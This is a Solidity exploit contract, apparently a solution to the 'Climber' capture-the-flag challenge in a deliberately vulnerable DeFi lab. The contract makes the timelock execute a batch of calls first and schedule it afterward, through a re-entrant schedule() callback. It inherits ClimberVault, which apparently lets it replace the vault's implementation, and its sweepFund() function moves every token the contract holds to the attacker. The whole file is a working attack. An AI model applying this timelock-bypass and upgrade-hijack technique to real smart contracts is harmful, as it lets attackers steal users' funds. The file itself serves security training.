// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

//Importing OpenZeppelin's Onlyowner Implementation
import {Ownable} from "openzeppelin-contracts/access/Ownable.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {ClimberVault} from "../ClimberVault.sol";

interface IClimberTimelock {
    function getOperationId(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external pure returns (bytes32);

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;

    function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
        external
        payable;

    function updateDelay(uint64 newDelay) external;
}

contract AttackerContract is ClimberVault {
    error NotClimberTimelock();

    IClimberTimelock private immutable climberTimelock;
    address private immutable climberVaultProxyAddress;
    address private immutable dvtAddress;
    address payable private sweeper;

    bytes[] private storedDataElements;

    constructor(address _dvtAddress, address _climberVaultProxyAddress, address _climberTimelock) {
        climberTimelock = IClimberTimelock(_climberTimelock);
        climberVaultProxyAddress = _climberVaultProxyAddress;
        dvtAddress = _dvtAddress;
        sweeper = payable(msg.sender);
    }

    function attack(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
        external
    {
        require(msg.sender == address(sweeper), "Not sweeper");
        // Store dataElements in storage
        for (uint256 i = 0; i < dataElements.length; i++) {
            storedDataElements.push(dataElements[i]);
        }

        climberTimelock.execute(targets, values, dataElements, salt);
    }

    function schedule(address[] calldata targets, uint256[] calldata values, bytes[] calldata, bytes32 salt) external {
        if (msg.sender != address(climberTimelock)) {
            revert NotClimberTimelock();
        }
        require(storedDataElements.length == 4, "Not enough dataElements");

        climberTimelock.schedule(targets, values, storedDataElements, salt);
    }

    function sweepFund(address tokenAddress, address _attacker) external {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(_attacker, token.balanceOf(address(this))), "Transfer failed");
    }

    function withdraw() public onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

    receive() external payable {}
}
